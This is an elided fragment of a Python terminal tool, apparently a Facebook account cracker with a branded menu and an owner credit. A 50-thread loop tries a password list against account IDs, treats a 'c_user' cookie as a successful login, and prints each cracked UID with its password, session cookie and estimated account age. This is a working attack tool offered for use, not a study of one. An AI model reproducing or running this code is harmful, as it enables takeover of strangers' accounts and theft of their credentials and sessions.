...
def o():
    ...
    print(logo)
    print(" \033[38;5;46m××××××××××××××××××××××××××××××××××××××××××××××××")
    jalan(" \033[38;5;196m[\033[38;5;195mA\033[38;5;196m]\033[38;5;195m PERSONAL \033[1;91m[\033[1;97mWORKING\033[1;91m]")
    ...
    print(" \033[38;5;196m[\033[38;5;195mD\033[38;5;196m]\033[38;5;195m MY BOW ACCOUNT")
    print(" \033[38;5;196m[\033[38;5;195mE\033[38;5;196m]\033[38;5;195m SEND MASSAGE")
    ...
    if SHUVO == 'C':
        ...
        return None
    if SHUVO == 'D':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100008935113780&mibextid=ZbWKwL')
        return None
    if SHUVO == 'E':
...
logo = ("""
 ...
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTOOL STATUS  \033[38;5;196m: \033[38;5;195m TRY                                 \033[38;5;46m|
 \033[38;5;46m|     \033[38;5;196m[\033[38;5;45m✓\033[38;5;196m] \033[38;5;195mTEAM         \033[38;5;196m:  \033[38;5;195mP4NT3R                                 \033[38;5;46m|
 ...
 \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m SHUVO FB ACCOUNT
 \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××""")
def linex():
	print(' \033[38;5;46m×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def asha(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :SHUVO = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :SHUVO = ' ~> 2009'
        elif uid[:8] in ['10000000']        :SHUVO = ' ~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:SHUVO = ' ~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:SHUVO = ' 2010'
        elif uid[:6] in ['100001']          :SHUVO = ' ~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :SHUVO = ' ~> 2011/2012'
        elif uid[:6] in ['100004']          :SHUVO = ' - 2012/2013'
        elif uid[:6] in ['100005','100006'] :SHUVO = ' ~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :SHUVO = ' ~> 2014/2015'
        elif uid[:6] in ['100009']          :SHUVO = ' ~> 2015'
        elif uid[:5] in ['10001']           :SHUVO = ' ~> 2015/2016'
        elif uid[:5] in ['10002']           :SHUVO = ' ~> 2016/2017'
        elif uid[:5] in ['10003']           :SHUVO = ' ~> 2018/2019'
        elif uid[:5] in ['10004']           :SHUVO = ' ~> 2019/2020'
        elif uid[:5] in ['10005']           :SHUVO = ' ~> 2020'
        elif uid[:5] in ['10006','10007','']:SHUVO = ' ~> 2021'
        elif uid[:5] in ['10008']           :SHUVO = ' ~>2022'
        elif uid[:5] in ['10009']           :SHUVO = ' ~> 2023'
        else:SHUVO=''
...
def SHUVO():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print(f' \033[38;5;196m[\033[38;5;45m•\033[38;5;196m]\033[38;5;195m TOOL OWNER \033[1;97m: \033[38;5;45mASRAFUL ISLAM SHUVO')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('    \033[38;5;45m[SHUVO-OK💉] '+uid+' | '+ps+'\033[38;5;46m'+asha(uid)+'\n    \033[38;5;196m[Usar Agent🤖]\033[38;5;195m'+pro+' \033[1;91m ')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                #print('\r\r\33[1;31m [SHUVO-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r \33[1;93m[%sSHUVO\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(H,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
